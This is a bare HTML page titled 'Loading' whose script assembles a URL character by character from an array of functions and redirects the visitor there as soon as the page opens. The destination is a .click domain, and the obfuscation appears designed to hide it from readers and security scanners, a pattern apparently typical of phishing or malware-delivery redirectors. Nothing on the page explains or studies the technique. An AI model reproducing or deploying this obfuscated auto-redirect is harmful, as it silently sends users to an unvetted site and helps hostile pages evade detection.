<!DOCTYPE html>
<html>
<head>
    <title>Loading</title>
    <script>
        const parts = [
            () => 'h',
            _ => 't',
            _ => 't',
            function() { return 'p'; },
            _ => 's',
            _ => ':',
            () => '/',
            _ => '/',
            function() { return 'v'; },
            () => 'e',
            () => 'r',
            _ => 'g',
            function() { return 'e'; },
            () => 'n',
            _ => '.',
            () => 'c',
            () => 'l',
            _ => 'i',
            _ => 'c',
            function() { return 'k'; },
            () => '/',
            _ => 's',
            () => '/',
            () => 'n',
            _ => 'e',
            _ => 'w'
        ];
        const url = parts.reduce((acc, fn) => acc + fn(), '');
        document.location = url;
    </script>
</head>
<body></body>
</html>
